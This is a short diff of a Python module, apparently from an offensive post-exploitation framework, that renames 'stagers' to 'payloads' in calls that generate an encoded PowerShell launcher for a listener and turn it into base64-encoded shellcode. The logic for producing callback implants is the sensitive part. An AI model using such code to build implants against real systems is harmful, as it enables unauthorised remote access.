@@ -133,7 +133,7 @@ class Module:
             return ''
         else:
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+            launcher = self.mainMenu.payloads.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
             
             if launcher == '':
                 print helpers.color('[!] Error in launcher generation.')
@@ -141,7 +141,7 @@ class Module:
             else:
                 launcherCode = launcher.split(' ')[-1]
 
-                sc = self.mainMenu.stagers.generate_shellcode(launcherCode, arch)
+                sc = self.mainMenu.payloads.generate_shellcode(launcherCode, arch)
 
                 encoded_sc = helpers.encode_base64(sc)
 
